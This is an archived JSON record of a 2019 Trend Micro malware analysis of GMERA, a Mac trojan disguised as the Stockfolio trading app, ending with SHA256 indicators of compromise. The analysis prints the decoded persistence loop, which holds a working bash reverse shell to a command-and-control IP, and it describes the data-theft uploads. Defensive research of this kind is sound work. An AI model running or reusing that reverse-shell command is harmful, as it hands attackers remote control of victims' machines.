{
    "id": "53400b83-5525-4209-b090-c39e031fa361",
    "created_at": "2023-01-12T15:02:29.868894Z",
    "updated_at": "2025-03-27T02:06:02.04679Z",
    "deleted_at": null,
    "sha1_hash": "112466d9802a042adb3446b78268a81a8cde1bae",
    "title": "2019-09-20 - Mac Malware that Spoofs Trading App Steals User Information, Uploads it to Website",
    "authors": "",
    "file_creation_date": "2022-05-28T15:27:02Z",
    "file_modification_date": "2022-05-28T15:27:02Z",
    "file_size": 121979,
    "plain_text": "# Mac Malware, Spoofs App, Steals User Information\n\n**[blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/](https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/)**\n\nSeptember 20, 2019\n\nUnlike in the pre-internet era, when trading in the stock or commodities market involved a phone call to a broker — a move\nwhich often meant additional fees for would-be traders — the rise of trading apps placed the ability to trade in the hands of\nordinary users. However, their popularity has led to their abuse by cybercriminals who create fake trading apps as lures for\nunsuspecting victims to steal their personal data. We recently found and analyzed an example of such an app, which had a\n[malicious malware variant that disguised itself as a legitimate Mac-based trading app called Stockfolio.](https://stockfolioapp.com/)\n\nWe found two variants of the malware family. The first one contains a pair of shell scripts and connects to a remote site to\ndecrypt its encrypted codes while the second sample, despite using a simpler routine involving a single shell script, actually\nincorporates a persistence mechanism.\n\n**Sample 1: Trojan.MacOS.GMERA.A**\n\nWe found the first sample (detected as Trojan.MacOS.GMERA.A) while checking suspicious shell scripts that were flagged by\nour [machine learning system. At first glance, it was challenging to directly identify its malicious behavior because the shell script](https://www.trendmicro.com/vinfo/ph/security/definition/machine-learning)\nreferences other files such as AppCode, .pass and .app. To verify that the behavior was indeed malicious, we sourced the\nparent file using both our infrastructure and the aggregate website VirusTotal (which had the sample but lacked detections from\nother major security vendors at the time of writing).\n\n[Figure 1. The suspicious shell script which was flagged by our system](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/09/stockfoli-mac-malware-1.png)\n\nFigure 1. The suspicious shell script which was flagged by our system\n\nThe initial sample we analyzed was a zip archive file (detected as Trojan.MacOS.GMERA.A) that contained an app bundle\n(Stockfoli.app) and a hidden encrypted file (.app). The fake app presents itself as legitimate to trick users, but we found that it\ncontained several malicious components.\n\nFigure 2. Content of the zip file. Note that the app bundle is missing the “o” at the end, whereas the legitimate app is called\nStockfolio.\n\n**The zip file and its contents**\n\nThe first suspicious component we found was an app bundle under the Resources directory, which seems to be a copy of the\nlegitimate Stockfolio version 1.4.13 but with the malware author’s digital certificate.\n\nComparing it to the Resources directory of the current version (1.5) found on the Stockfolio website revealed a number of\ndifferences, as shown in the figure below.\n\n\n-----\n\nFigure 3. Comparison of the app bundle folder structure between the malware variant (top) and the legitimate app (version\n1.5, bottom).\n\nFigure 3. Comparison of the app bundle folder structure between the malware variant (top) and the legitimate app (version\n1.5, bottom).\n\nFigure 3. Comparison of the app bundle folder structure between the malware variant (top) and the legitimate app (version 1.5,\nbottom).\n\n**Technical Analysis**\n\nWhen the app is executed, an actual trading app interface will appear on-screen. However, unbeknownst to the user, the\nmalware variant is already performing its malicious routines in the background.\n\n[Figure 4. interface displayed when the malware app bundle is executed](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/09/stockfoli-mac-malware-4.png)\n\nFigure 4. interface displayed when the malware app bundle is executed\n\nThe main Mach-O executable will launch the following bundled shell scripts in the Resources directory:\n\nplugin\nstock\n\n**The plugin and stock shell scripts**\n\nThe plugin shell script collects the following information from the infected system:\n\nusername\nIP address\napps in /Applications\nfiles in ~/Documents\nfiles in ~/Desktop\nOS installation date\nfile system disk space usage\ngraphic/display information\nwireless network information\nscreenshots\n\nIt then encodes the collected information using base64 encoding and saves the collected information in a hidden file: /tmp/.info.\nIt then uploads the file to hxxps://appstockfolio.com/panel/upload[.]php using the collected username and machine serial\nnumber as identifiers.\n\nIf a successful response is sent from the URL, it will write the response in another hidden file ~/Library/Containers/.pass\n\nFigure 5 . The “plugin” script\n\nThe stock shell script will copy Stockfoli.app/Contents/Resources/appcode to /private/var/tmp/appcode. It then locates the .app\nfile, which is the hidden file in the zip bundle that comes with Stockfoli.app\n\nFigure 6. The “stock” script\n\nIt decodes the b64-encoded .app file, executes it, then drops the following:\n\nFile Details\n\n_/tmp/.hostname_ gmzera54l5qpa6lm.onion\n\n_/tmp/.privatkey_ RSA private key\n\n\n-----\n\nIt will delete the .app file then check if the file _/Library/Containers/.pass exists. Using the contents of the .pass file as the key,_\nthe malware variant will decrypt /private/var/tmp/appcode, which is encrypted using AES-256-CBC. It then saves the decrypted\nfile to /tmp/appcode. Finally, it will execute the appcode. If it fails to do so, it will delete the /tmp/appcode file and\n_~/Library/Containers/.pass. Note that in the sample we analyzed, the decryption routine failed since the sample was not able to_\ncreate ~/Library/Containers/.pass.\n\n[Figure 7. Comparison of the code-signing information of the malicious app (top) and the legitimate Stockfolio app (bottom)](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/09/stockfoli-mac-malware-7.png)\n\nFigure 7. Comparison of the code-signing information of the malicious app (top) and the legitimate Stockfolio app (bottom)\n\nWe suspect the file appcode is a malware file that contains additional routines. However, at the time of writing, we were unable\nto decrypt this file since the upload URL hxxps://appstockfolio.com/panel/upload[.]php was inaccessible (according to\nVirusTotal, the domain was active from January to February 2019). Furthermore, we suspect that the full malware routine uses\nthe TOR network due to the presence of the unused address gmzera54l5qpa6lm[.]onion.\n\n**Sample 2: Trojan.MacOS.GMERA.B**\n\nUsing the digital certificate of the first sample, we were able to find a second variant (detected as Trojan.MacOS.GMERA.B)\nthat was uploaded to VirusTotal on June 2019. Like the first variant, it contains an embedded copy of Stockfolio.app version\n1.4.13 with the malware author’s digital certificate. It launches the app in a similar manner when executed to disguise its\nmalicious intent.\n\n[Figure 8. The bundle structure of Trojan.MacOS.GMERA.B](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/09/stockfoli-mac-malware-8.png)\n\nFigure 8. The bundle structure of Trojan.MacOS.GMERA.B\n\nOnce opened, Trojan.MacOS.GMERA.B will execute the embedded copy of Stockfolio version 1.4.13, after which it will launch\nthe shell script run.sh\n\nThe script run.sh collects usernames and ip addresses from the infected machine via the following command:\n\nusername = ‘whoami’\nip address = 'curl -s ipecho.net/plain'\n\nIt connects to the malware URL hxxp://owpqkszz[.]info to send the username and IP address information using the following\nformat:\n\nhxxp://owpqkszz[.]info/link.php?{username}&{ip address}\n\nAs part of its routine, the malware also drops the following files:\n\nFile Details\n\n_/private/tmp/.com.apple.upd.plist_ Copy of ~/Library/LaunchAgents/.com.apple.upd.plist\n\n_~/Library/LaunchAgents/.com.apple.upd.plist_ Persistence mechanism\n\n_/tmp/loglog_ Malware execution logs\n\nIt then creates a simple reverse shell to the C&C server 193[.]37[.]212[.]176. Once connected, the malware author can run shell\ncommands.\n\n[Figure 9. Content of the run.sh shell script](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/09/stockfoli-mac-malware-9.png)\n\nFigure 9. Content of the run.sh shell script\n\nOne of the primary changes found in the second variant, aside from the simplified routine, is the presence of a persistence\nmechanism via the creation of a property list (plist) file: ~/Library/LaunchAgents/.com.apple.upd.plist\n\n[Figure 10. Hidden plist file used for persistence.](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/09/stockfoli-mac-malware-10.png)\n\nFigure 10. Hidden plist file used for persistence\n\nAfter we decoded the b64-encoded arguments for the plist file, we found the following code:\n\n\n-----\n\nwhile :; do sleep 10000; screen X quit; lsof ti :25733 | xargs kill 9; screen d m bash c bash i\n>/dev/tcp/193.37.212.176/25733 0>&1'; done\n\nThis code instructs the plist file to constantly create the reverse shell mentioned earlier, occuring every 10,000 seconds. The\nsimple reverse shell created was observed to use the ports 25733-25736.\n\n**Conclusion**\n\nGiven the changes we’ve seen from the malware variant’s initial iteration to its current one, we notice a trend in which the\nmalware authors have simplified its routine and added further capabilities. It’s possible that the people behind it are looking for\nways to make it more efficient – perhaps even adding evasion mechanisms in the future.\n\nIn the meantime, we advise aspiring traders to practice caution when it comes to the programs they download, especially if it\ncomes from an unknown or suspicious website. We recommend that users only download apps from official sources to\nminimize chances of downloading a malicious one. We reached out to Apple before publication of this entry, and they informed\nus that the code signing certificate of this fake app's developers was revoked in July of this year.\n\n**Trend Micro solutions**\n\n[End users can benefit from security solutions such as Trend Micro Home Security for Mac, which provides comprehensive](https://blog.trendmicro.com/en_us/forHome/products/maximum-security.html)\nsecurity and multi-device protection against cyberthreats. Enterprises can benefit from Trend Micro’s Smart Protection\nSuites with XGen™ security, which infuses high-fidelity machine learning into a blend of threat protection techniques to\neliminate security gaps across any user activity and any endpoint.\n\n**Indicators of Compromise (IoCs)**\n\n**Sample 1**\n\n**Filename** **SHA256** **Detection name**\n\nplugin 6fe741ef057d38dd6d9bbe02dacbcb4940dac6c32e0f50a641e73727d6bf60d9 Trojan.SH.GMERA.A\n\nstock 6f48ef0d76ce68bbca53b05d2d22031aec5ce997e7227c3dcb20809959680f11 Trojan.SH.GMERA.A\n\nStockfoli efd5b96f489f934f2465a185e43fddf50fcde51b12a8fb91d5d93b09a21706c7 Trojan.MacOS.GMERA.A\n\nTrial_Stockfoli.zip 18e1db7c37a63d987a5448b4dd25103c8053799b0deea5f45f00ca094afe2fe7 Trojan.MacOS.GMERA.A\n\n**Sample 2**\n\n**Filename** **SHA256** **Detection name**\n\ncom.apple.upd.plist be8b6549da925f285307b17c616a010a9418af70d090ed960ade575ce27c7787 Trojan.MacOS.GMERA.B\n\nrun.sh d50f5e94f2c417623c5f573963cc777c0676cc7245d65967ca09a53f464d2b50 Trojan.SH.GMERA.B\n\n\nStockfoli 83df2f39140679a9cfb55f9c839ff8e7638ba29dba164900f9c77bb177796e03\n(sample 2)\n\nTrial_Stockfoli.zip faa2799751582b8829c61cbfe2cbaf3e792960835884b61046778d17937520f4\n(sample 2)\n\nMalware\n\n\nTrojan.MacOS.GMERA.B\n\nTrojan.MacOS.GMERA.B\n\n\nWe recently found and analyzed a malicious malware variant that disguised itself as a legitimate Mac-based trading app called\nStockfolio. We found two variants of the malware family.\n\nBy: Luis Magisa September 20, 2019 Read time: ( words)\n\nContent added to Folio\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-09-20 - Mac Malware that Spoofs Trading App Steals User Information, Uploads it to Website.pdf"
    ],
    "report_names": [
        "2019-09-20 - Mac Malware that Spoofs Trading App Steals User Information, Uploads it to Website.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535749,
    "ts_updated_at": 1743041162,
    "ts_creation_date": 1653751622,
    "ts_modification_date": 1653751622,
    "files": {
        "pdf": "https://archive.orkl.eu/112466d9802a042adb3446b78268a81a8cde1bae.pdf",
        "text": "https://archive.orkl.eu/112466d9802a042adb3446b78268a81a8cde1bae.txt",
        "img": "https://archive.orkl.eu/112466d9802a042adb3446b78268a81a8cde1bae.jpg"
    }
}